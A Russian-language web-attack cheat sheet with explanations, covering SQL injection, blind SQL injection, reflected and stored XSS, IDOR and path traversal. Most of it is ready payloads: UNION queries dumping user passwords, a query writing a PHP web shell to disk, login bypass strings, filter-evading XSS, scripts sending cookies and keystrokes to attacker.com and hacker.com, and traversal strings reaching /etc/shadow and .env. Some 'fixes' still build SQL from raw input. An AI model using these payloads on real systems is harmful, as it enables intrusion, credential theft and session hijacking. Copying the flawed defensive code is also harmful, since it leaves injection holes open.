# SQL Injection - Полное руководство с кодами и пояснениями


## Обнаружение уязвимости


Пояснение: Проверяем, реагирует ли приложение на специальные символы SQL
' 
' OR '1'='1
' OR 1=1--
" OR "1"="1
' OR '1'='1' --


Если приложение ведет себя по-разному - возможно, есть уязвимость


## Определение структуры базы данных


Пояснение: Узнаем сколько колонок возвращает запрос и какие из них отображаются
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--


ORDER BY помогает найти количество колонок, UNION проверяет какие колонки видны на странице


## Извлечение системной информации


Пояснение: Получаем информацию о базе данных и пользователе
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,current_user,3--


Эти запросы показывают версию СУБД, имя базы данных и текущего пользователя


## Получение структуры таблиц


Пояснение: Узнаем какие таблицы и колонки есть в базе данных
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--


information_schema содержит метаинформацию о всех таблицах и колонках


## Извлечение данных пользователей


Пояснение: Получаем реальные данные из таблиц пользователей
' UNION SELECT 1,username,password FROM users--
' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--
' UNION SELECT 1,CONCAT(username,':',password),3 FROM admin_users--


Эти запросы извлекают логины и пароли из таблиц пользователей


## Чтение файлов


Пояснение: Пытаемся прочитать системные файлы через БД
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
' UNION SELECT 1,LOAD_FILE('C:/windows/system32/drivers/etc/hosts'),3--


LOAD_FILE позволяет читать файлы из файловой системы


## Запись файлов


Пояснение: Создаем файлы на сервере (например, веб-шелл)
' UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE '/var/www/shell.php'--
' UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE 'C:/xampp/htdocs/shell.php'--


INTO OUTFILE создает файлы на сервере


## Слепая SQL инъекция


Пояснение: Используем когда результаты не видны напрямую
' AND SUBSTRING(database(),1,1)='a'--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND (SELECT COUNT(*) FROM users) > 10--


Проверяем условия по поведению приложения или времени ответа


## Временные задержки


Пояснение: Используем задержки для подтверждения уязвимости
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '00:00:05'--


Если запрос выполняется дольше - уязвимость подтверждена


## Обход аутентификации


Пояснение: Самые простые payloads для входа без пароля
admin' --
admin' OR '1'='1
' OR 1=1--
' OR '1'='1' --


Комментарии (--) обрезают проверку пароля, OR 1=1 делает условие всегда истинным


# 🔍 Blind SQL Injection - Объяснение Простым Языком


## 🤔 Что это такое?


Blind SQL Injection - это как угадывать пароль от замка, не видя самого замка. 


Представьте:
- 🚪 Обычная SQL-инъекция - вы видите, что написано на бумажке внутри (данные из базы)
- 🚪 Blind SQL-инъекция - вы только слышите, щелкает ли замок или нет


## 🎭 Два основных типа


### 1. Boolean-Based (По ответу "Да/Нет")
# Спрашиваем: "Первый символ пароля - 'a'?"
# Если ДА - сайт показывает товар
# Если НЕТ - сайт говорит "товара нет"


# Пример:
site.com/product?id=1 AND password LIKE 'a%'


Как работает:
- ✅ Если условие ВЕРНО - сайт ведет себя нормально
- ❌ Если условие НЕВЕРНО - сайт выдает ошибку или другой контент
- 🔍 Мы перебираем варианты и смотрим на реакцию сайта


### 2. Time-Based (По времени ответа)
# Спрашиваем: "Первый символ пароля - 'a'?"
# Если ДА - подожди 5 секунд ответа
# Если НЕТ - ответи сразу


# Пример:
site.com/product?id=1 AND IF(password LIKE 'a%', SLEEP(5), 0)


Как работает:
- ⏱️ Если условие ВЕРНО - сайт "задумывается" на несколько секунд
- 🚀 Если условие НЕВЕРНО - сайт отвечает быстро
- ⏰ Мы измеряем время ответа и делаем выводы


## 🧩 Как взламывают посимвольно?


Процесс напоминает угадывание слова:


# Шаг 1: Узнаем длину пароля
"Пароль состоит из 8 символов?" ✅ ДА
"Пароль состоит из 9 символов?" ❌ НЕТ
→ Значит пароль из 8 символов


# Шаг 2: Угадываем первый символ
"Первый символ - 'a'?" ❌ НЕТ
"Первый символ - 'b'?" ❌ НЕТ  
"Первый символ - 'c'?" ✅ ДА
→ Первый символ 'c'


# Шаг 3: Угадываем второй символ
"Второй символ - 'a'?" ❌ НЕТ
"Второй символ - 'd'?" ✅ ДА
→ Второй символ 'd'


# И так далее...




Реальный пример:
Узнаем имя базы данных посимвольно:


Первый символ имени БД - 'm'?
site.com/page?id=1 AND SUBSTRING(database(), 1, 1) = 'm'


Второй символ имени БД - 'y'?  
site.com/page?id=1 AND SUBSTRING(database(), 2, 1) = 'y'


Третий символ имени БД - 's'?
site.com/page?id=1 AND SUBSTRING(database(), 3, 1) = 's'


Результат: 'mys'... (продолжаем пока не получим 'mysql')




🎯 Что можно узнать таким способом?


1. 📊 Имена баз данных - SELECT database()
2. 👤 Имена пользователей - SELECT username FROM users
3. 🔑 Пароли - SELECT password FROM users WHERE id=1
4. 📁 Структуру таблиц - какие таблицы и колонки есть
5. ⚙️ Версию базы данных - SELECT version()


## ⚡ Ускоренный метод (битовый)


Вместо перебора 100 символов - всего 7 вопросов на символ:


Каждый символ имеет ASCII код (число от 0 до 127)


Спрашиваем про биты числа:
"ASCII код первого символа содержит бит 64?" ✅ ДА  (64)
"Содержит бит 32?" ❌ НЕТ (0)  
"Содержит бит 16?" ✅ ДА  (+16 = 80)
"Содержит бит 8?"  ✅ ДА  (+8 = 88)
"Содержит бит 4?"  ❌ НЕТ (0)
"Содержит бит 2?"  ❌ НЕТ (0) 
"Содержит бит 1?"  ❌ НЕТ (0)


Результат: 64 + 16 + 8 = 88
ASCII 88 = буква 'X’


Reflected XSS (GET/POST) - Подробное пояснение кодов


## Уязвимый код сервера


```php
<?php
$search = $_GET['q'];
echo "Результаты поиска: " . $search;
?>
```


**Пояснение:** Этот код принимает значение параметра `q` из URL и выводит его напрямую в HTML без какой-либо проверки или кодирования. Это создает уязвимость - любой переданный скрипт будет выполнен в браузере.


## Атака через GET-параметры


```
http://site.com/search.php?q=<script>alert('XSS')</script>
```


**Пояснение:** В параметр `q` передается JavaScript код. Когда сервер возвращает страницу, браузер видит тег `<script>` и выполняет его содержимое. Пользователь увидит всплывающее окно с текстом 'XSS'.


## Атака через POST-форму


```html
<form action="http://site.com/search.php" method="POST">
    <input name="q" value="<script>alert('XSS')</script>">
</form>
```


**Пояснение:** Форма отправляет данные через POST-запрос. Принцип тот же, что и с GET, но данные не видны в URL. Это может обойти некоторые системы защиты, которые проверяют только GET-параметры.


## Базовые XSS payloads


### 1. Простой script тег
```html
<script>alert('XSS')</script>
```
**Пояснение:** Самый простой вектор атаки. Браузер интерпретирует содержимое тега `<script>` как JavaScript код и выполняет его.


### 2. Через атрибут onerror изображения
```html
<img src=x onerror=alert('XSS')>
```
**Пояснение:** Создает тег изображения с несуществующим источником (`src=x`). Когда загрузка изображения fails, срабатывает обработчик `onerror`, который выполняет JavaScript код.


### 3. Через SVG тег
```html
<svg onload=alert('XSS')>
```
**Пояснение:** SVG (Scalable Vector Graphics) поддерживает обработчики событий. При загрузке SVG срабатывает событие `onload`, выполняющее вредоносный код.


## Обход фильтров


### 1. Разный регистр тегов
```html
<ScRiPt>alert('XSS')</ScRiPt>
```
**Пояснение:** Некоторые фильтры ищут только `<script>` в нижнем регистре. Изменение регистра может обойти такую защиту, так как браузер все равно выполнит код.


### 2. Кавычки в атрибутах
```html
<img src=x onerror="alert('XSS')">
```
**Пояснение:** Добавление кавычек вокруг значения атрибута может обойти фильтры, которые ищут определенные паттерны без кавычек.


### 3. Через iframe с javascript
```html
<iframe src="javascript:alert('XSS')">
```
**Пояснение:** Использует схему `javascript:` в атрибуте `src`. Браузер выполнит JavaScript код при загрузке iframe.


## Кража cookies


### 1. Через Fetch API
```html
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```
**Пояснение:** JavaScript получает cookies текущего сайта через `document.cookie` и отправляет их на сервер злоумышленника с помощью Fetch API.


### 2. Через изображение
```html
<img src=x onerror="this.src='http://attacker.com/steal?cookie='+document.cookie">
```
**Пояснение:** При ошибке загрузки изображения срабатывает `onerror`, который изменяет `src` на URL злоумышленника с cookies в параметрах.


## Защита - кодирование вывода


```php
<?php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
?>
```


**Пояснение:** Функция `htmlspecialchars()` преобразует специальные HTML символы (`<`, `>`, `"`, `'`, `&`) в их HTML сущности. Это предотвращает интерпретацию тегов браузером.


- `ENT_QUOTES` - кодирует как двойные, так и одинарные кавычки
- `'UTF-8'` - указывает кодировку для корректной обработки


## Защита - Content Security Policy


```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```


**Пояснение:** CSP указывает браузеру, откуда можно загружать ресурсы. `default-src 'self'` разрешает загрузку только с того же домена, блокируя внешние скрипты.


## Защита - валидация входных данных


```php
$input = preg_replace('/[^a-zA-Z0-9]/', '', $_GET['q']);
```


**Пояснение:** Регулярное выражение удаляет все символы, кроме букв и цифр. Это жесткий метод, но эффективно предотвращает XSS, удаляя все потенциально опасные символы.


## Сценарий атаки через ссылку


```
http://bank.com/transfer?amount=1000&to=hacker&confirm=<script>stealCookies()</script>
```


**Пояснение:** Злоумышленник создает ссылку, которая при переходе выполняет скрипт `stealCookies()`. Если пользователь аутентифицирован на bank.com, скрипт получит доступ к его cookies и сессии.


## Ключевые моменты


- Reflected XSS требует взаимодействия пользователя (переход по ссылке или отправка формы)
- Данные не сохраняются на сервере, а сразу возвращаются в ответе
- Опасность в том, что скрипт выполняется в контексте домена приложения
- Защита требует кодирования всех пользовательских данных перед выводом в HTML


# Stored XSS - Краткое руководство


## Что такое Stored XSS?


Stored XSS - когда вредоносный скрипт сохраняется на сервере (в базе данных) и выполняется у всех пользователей, которые просматривают зараженную страницу.


## Уязвимый код


```php
<?php
// Сохраняем комментарий в БД
$comment = $_POST['comment'];
$db->query("INSERT INTO comments VALUES ('$comment')");


// Показываем комментарии
$comments = $db->query("SELECT * FROM comments");
foreach($comments as $comment) {
    echo "<div>" . $comment['text'] . "</div>";
}
?>
```


**Пояснение:** Код сохраняет комментарии без проверки и выводит их без кодирования. Вредоносный скрипт сохранится в базе и будет выполняться у всех пользователей.


## Примеры атак


### Базовый payload для комментариев:
```html
<script>alert('XSS')</script>
```
**Пояснение:** Простой скрипт, который выполнится у каждого пользователя, просматривающего комментарии.


### Кража cookies:
```html
<script>
fetch('http://hacker.com/steal?cookie=' + document.cookie)
</script>
```
**Пояснение:** Скрипт отправляет cookies всех пользователей на сервер злоумышленника.


### Кейлоггинг:
```html
<script>
document.onkeypress = function(e) {
    fetch('http://hacker.com/log?key=' + e.key)
}
</script>
```
**Пояснение:** Перехватывает нажатия клавиш и отправляет их злоумышленнику.


### Перенаправление:
```html
<script>window.location = 'http://fake-site.com'</script>
```
**Пояснение:** Перенаправляет пользователей на фишинговый сайт.


## Обход фильтров


### Без тегов script:
```html
<img src=x onerror=alert('XSS')>
```
**Пояснение:** Использует тег img с обработчиком ошибки для выполнения кода.


### Через SVG:
```html
<svg onload=alert('XSS')>
```
**Пояснение:** SVG тег с событием onload выполняет код при загрузке.


### Кодирование символов:
```html
&#60;script&#62;alert('XSS')&#60;/script&#62;
```
**Пояснение:** HTML-entities могут быть декодированы браузером и выполниться как код.


## Где ищут Stored XSS?


- **Комментарии** и отзывы
- **Профили пользователей** (имя, описание)
- **Сообщения форума**
- **Названия товаров** в интернет-магазинах
- **Статьи и посты** в блогах


## Защита


### Кодирование вывода:
```php
<?php
echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
?>
```
**Пояснение:** Преобразует опасные символы в HTML-сущности, предотвращая выполнение скриптов.


### Content Security Policy:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```
**Пояснение:** Запрещает выполнение inline-скриптов и загрузку ресурсов с внешних доменов.


### Валидация входных данных:
```php
$comment = strip_tags($_POST['comment']);
```
**Пояснение:** Удаляет все HTML-теги из пользовательского ввода.


## Почему Stored XSS опаснее Reflected?


- **Не требует взаимодействия с жертвой** - скрипт выполняется автоматически
- **Поражает всех пользователей** - кто просматривает зараженную страницу
- **Долговременный эффект** - пока данные не удалены из базы
- **Сложнее обнаружения** - администратор может не знать о заражении


## Пример реальной атаки


1. Злоумышленник оставляет комментарий со скриптом на форуме
2. Скрипт сохраняется в базе данных форума
3. Каждый пользователь, просматривающий эту тему, выполняет скрипт
4. Скрипт крадет cookies сессии и отправляет злоумышленнику
5. Злоумышленник использует cookies для доступа к аккаунтам пользователей


# IDOR (Insecure Direct Object Reference) - Краткое руководство


## Что такое IDOR?


IDOR - уязвимость, когда приложение дает доступ к данным по их ID без проверки прав доступа. Пользователь может посмотреть чужие данные, просто изменив число в ссылке.


## Уязвимый код


```php
<?php
$user_id = $_GET['id'];
$user = $db->query("SELECT * FROM users WHERE id = $user_id");
echo $user['email'];
?>
```


**Пояснение:** Код берет ID пользователя из адреса и показывает его email. Никто не проверяет, имеет ли текущий пользователь право смотреть эти данные.


## Примеры атак


### Просмотр чужого профиля:
```
site.com/user?id=123  →  site.com/user?id=124
```
**Пояснение:** Меняем ID пользователя в адресе и получаем доступ к чужому профилю.


### Чужие заказы:
```
store.com/order?num=1001  →  store.com/order?num=1002
```
**Пояснение:** Подбираем номер заказа и смотрим заказы других людей.


### Скачивание файлов:
```
site.com/files?doc=report.pdf  →  site.com/files?doc=secret.pdf
```
**Пояснение:** Меняем название файла и скачиваем чужие документы.


## Где искать IDOR?


### Параметры в URL:
```
/api/user/123
/profile?user_id=456
/orders?number=789
```


**Пояснение:** Цифры в адресе страницы - это скорее всего ID объектов.


### Параметры в формах:
```html
<input type="hidden" name="account_id" value="123">
```


**Пояснение:** Скрытые поля в формах тоже могут содержать ID.


### API запросы:
```json
{
    "user_id": 123,
    "document_id": 456
}
```


**Пояснение:** ID могут передаваться в JSON телах запросов.


## Защита


### Проверка прав доступа:
```php
<?php
$requested_id = $_GET['id'];
$current_user_id = $_SESSION['user_id'];


if ($requested_id != $current_user_id) {
    die("Доступ запрещен");
}
?>
```


**Пояснение:** Сравниваем ID из запроса с ID текущего пользователя.


### Случайные токены:
```php
<?php
$token = $_GET['token'];
$order = $db->query("SELECT * FROM orders WHERE access_token = '$token'");
?>
```


**Пояснение:** Используем случайные строки вместо предсказуемых цифровых ID.


### Проверка в базе данных:
```sql
SELECT * FROM documents 
WHERE id = 123 
AND owner_id = 456  -- ID владельца
```


**Пояснение:** База данных проверяет, что документ принадлежит запрашивающему пользователю.


## Простые примеры защиты


### Для личного кабинета:
```php
<?php
// Показываем только данные текущего пользователя
$user_id = $_SESSION['user_id'];
$user = $db->query("SELECT * FROM users WHERE id = $user_id");
?>
```


**Пояснение:** Вообще не используем ID из запроса, берем только из сессии.


### Для администраторов:
```php
<?php
if ($_SESSION['role'] != 'admin') {
    die("Требуются права администратора");
}
?>
```


**Пояснение:** Проверяем роль пользователя перед доступом к данным.


## Что проверять при тестировании


- Меняйте ID в адресной строке
- Изменяйте параметры в формах
- Пробуйте разные номера заказов
- Тестируйте все цифровые параметры
- Проверяйте API endpoints


# Path Traversal - Краткое руководство


## Что такое Path Traversal?


Path Traversal - уязвимость, позволяющая читать или записывать файлы за пределами intended директории приложения. Также известна как Directory Traversal.


## Уязвимый код


```php
<?php
$file = $_GET['file'];
readfile('/var/www/uploads/' . $file);
?>
```


**Пояснение:** Код принимает имя файла из параметра и читает его без проверки. Можно выйти за пределы папки uploads.


## Примеры атак


### Базовый обход:
```
site.com/download?file=../../etc/passwd
```
**Пояснение:** `../` поднимается на уровень выше в файловой системе, достигая системных файлов.


### Чтение конфигураций:
```
site.com/view?document=../../../config/database.yml
```
**Пояснение:** Получаем доступ к конфигурационным файлам приложения.


### Чтение исходного кода:
```
site.com/load?page=../../index.php
```
**Пояснение:** Читаем PHP файлы, которые должны выполняться, а не отображаться.


## Методы обхода защиты


### URL-кодирование:
```
file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
**Пояснение:** Кодируем специальные символы в URL-формате.


### Двойное кодирование:
```
file=%252e%252e%252fetc%252fpasswd
```
**Пояснение:** Кодируем уже закодированные символы для обхода фильтров.


### Использование обратных слешей:
```
file=..\..\..\windows\system32\drivers\etc\hosts
```
**Пояснение:** Для Windows-систем используем обратные слеши.


### Absolute path:
```
file=/etc/passwd
```
**Пояснение:** Прямое указание абсолютного пути.


## Защита


### Базовый фильтр:
```php
<?php
$file = $_GET['file'];
if (strpos($file, '..') !== false) {
    die('Invalid file');
}
?>
```


**Пояснение:** Проверяем наличие `..` в пути, но это легко обойти.


### Безопасный вариант:
```php
<?php
$file = basename($_GET['file']);
$path = '/var/www/uploads/' . $file;
if (!file_exists($path)) {
    die('File not found');
}
readfile($path);
?>
```


**Пояснение:** `basename()` удаляет все пути, оставляя только имя файла.


### White list разрешенных файлов:
```php
<?php
$allowed_files = ['report.pdf', 'data.csv', 'info.txt'];
$file = $_GET['file'];
if (!in_array($file, $allowed_files)) {
    die('File not allowed');
}
?>
```


**Пояснение:** Разрешаем только конкретные файлы из списка.


### Использование ID вместо имен:
```php
<?php
$file_id = (int)$_GET['file_id'];
$file = $db->query("SELECT filename FROM files WHERE id = $file_id");
readfile('/var/www/uploads/' . $file['filename']);
?>
```


**Пояснение:** Храним соответствие ID и имен файлов в базе данных.


## Примеры уязвимых endpoints


### Загрузка файлов:
```
/download?file=document.pdf
/files?name=image.jpg
/static?path=css/style.css
```


**Пояснение:** Endpoints для отдачи статических файлов часто уязвимы.


### Просмотр логов:
```
/logs?file=access.log
/debug?log=error.log
```


**Пояснение:** Функции просмотра логов могут позволять читать любые файлы.


### Backup файлы:
```
/backup?date=20231201
/export?type=sql
```


**Пояснение:** Endpoints для бэкапов могут раскрывать чувствительные данные.


## Что можно получить через Path Traversal


### Конфигурационные файлы:
```
/etc/passwd
/etc/shadow
/var/www/.env
/config/database.yml
```


**Пояснение:** Файлы с настройками и учетными данными.


### Исходный код:
```
 /var/www/index.php
/app/models/user.rb
/src/config.py
```


**Пояснение:** Исходники приложения для поиска других уязвимостей.


### Логи:
```
/var/log/apache2/access.log
/var/log/auth.log
```


**Пояснение:** Логи могут содержать чувствительную информацию.


## Простые payloads для тестирования


### Linux/Unix:
```
../../../../etc/passwd
....//....//....//etc/passwd
/etc/passwd%00
```


### Windows:
```
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\boot.ini
```






В разработке:
#### Категория A: Инъекции
3. NoSQL Injection  
4. Command Injection  
5. LDAP Injection  


#### Категория B: XSS атаки  
3. DOM-based XSS  
4. XSS через загрузку файлов  


#### Категория C: Broken Access Control
3. JWT Manipulation  
4. Privilege Escalation  
5. CORS Misconfiguration  


#### Категория D: Прочие уязвимости
1. CSRF (Cross-Site Request Forgery)  
2. SSRF (Server-Side Request Forgery)  
3. XXE (XML External Entity)  
4. File Upload Bypass  
5. Insecure Deserialization  
6. Security Misconfiguration  
7. Information Disclosure  
8. Broken Authentication  
9. Sensitive Data Exposure  
10. Using Components with Known Vulnerabilities  
11. Insufficient Logging & Monitoring